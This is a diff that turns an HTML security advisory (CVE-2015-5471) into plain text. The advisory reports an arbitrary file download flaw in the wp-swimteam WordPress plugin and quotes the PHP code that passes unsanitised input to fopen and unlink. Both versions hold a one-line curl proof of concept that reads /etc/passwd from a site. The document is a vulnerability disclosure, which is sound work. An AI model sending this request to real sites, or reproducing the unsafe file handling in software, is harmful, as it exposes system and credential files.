@@ -1,44 +1,32 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 134&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file download vulnerability in Wordpress Plugin wp-swimteam v1.44.10777&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-07-02&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wp-swimteam">https://wordpress.org/plugins/wp-swimteam</a>"&gt;<a href="https://wordpress.org/plugins/wp-swimteam&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-swimteam&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Mike Walsh <a href="http://www.MichaelWalsh.org/">www.MichaelWalsh.org</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-02&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; Through website&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Swim Team (aka wp-SwimTeam) is a comprehensive WordPress plugin to run a swim team including registration, volunteer assignments, scheduling, and much more.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in ./wp-swimteam/include/user/download.php doesn&amp;#039;t sanitize user input from downloading sensitive system files:
-</p>
-<pre>
- 50             $file = urldecode($args[&amp;#039;file&amp;#039;]) ;
- 51             $fh = fopen($file, &amp;#039;r&amp;#039;) or die(&amp;#039;Unable to load file, something bad has happened.&amp;#039;) ;
- 52 
- 53             while (!feof($fh))
- 54                 $txt .= fread($fh, 1024) ;
- 55 
- 56             //  Clean up the temporary file - permissions
- 57             //  may prevent this from succeedeing so use the &amp;#039;@&amp;#039;
- 58             //  to suppress any messages from PHP.
- 59 
- 60             @unlink($file) ;
- 61         }
- 62 
- 63         $filename = urldecode($args[&amp;#039;filename&amp;#039;]) ;
- 64         $contenttype = urldecode($args[&amp;#039;contenttype&amp;#039;]) ;
- 65 
- 66         // Tell browser to expect a text file of some sort (usually txt or csv)
- 67 
- 68         header(sprintf(&amp;#039;Content-Type: application/%s&amp;#039;, $contenttype)) ;
- 69         header(sprintf(&amp;#039;Content-disposition:  attachment; filename=%s&amp;#039;, $filename)) ;
- 70         print $txt ;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-5471&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=134"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ curl &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://www.vapidlabs.com/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&amp;amp;filename=/etc/passwd&amp;amp;contenttype=text/html&amp;amp;transient=1&amp;amp;abspath=/usr/share/wordpress&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.vapidlabs.com/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&amp;amp;filename=/etc/passwd&amp;amp;contenttype=text/html&amp;amp;transient=1&amp;amp;abspath=/usr/share/wordpress&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=134">http://www.vapid.dhs.org/advisory.php?v=134</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=134&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=134&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-</pre>
-<p>&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 134
+Title: Remote file download vulnerability in Wordpress Plugin wp-swimteam
+v1.44.10777
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-07-02
+Download Site: https://wordpress.org/plugins/wp-swimteam
+Vendor:Mike Walsh www.MichaelWalsh.org
+Vendor Notified: 2015-07-02
+Vendor Contact: Through website
+Description: Swim Team (aka wp-SwimTeam) is a comprehensive WordPress plugin to
+run a swim team including registration, volunteer assignments, scheduling, and
+much more.
+Vulnerability:
+The code in ./wp-swimteam/include/user/download.php doesn't sanitize user input
+from downloading sensitive system files: 50 $file = urldecode($args['file']) ;
+51 $fh = fopen($file, 'r') or die('Unable to load file, something bad has
+happened.') ; 52 53 while (!feof($fh)) 54 $txt .= fread($fh, 1024) ; 55 56 /
+/ Clean up the temporary file - permissions 57 // may prevent this from
+succeedeing so use the '@' 58 // to suppress any messages from PHP. 59 60
+@unlink($file) ; 61 } 62 63 $filename = urldecode($args['filename']) ; 64
+$contenttype = urldecode($args['contenttype']) ; 65 66 // Tell browser to
+expect a text file of some sort (usually txt or csv) 67 68 header(sprintf
+('Content-Type: application/%s', $contenttype)) ; 69 header(sprintf('Content-
+disposition: attachment; filename=%s', $filename)) ; 70 print $txt ;
+CVE-2015-5471
+JSON:Export
+Exploit Code:
+   1. $ curl "http://www.vapidlabs.com/wp-content/plugins/wp-swimteam/include/
+      user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/
+      html&transient=1&abspath=/usr/share/wordpress"
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=134
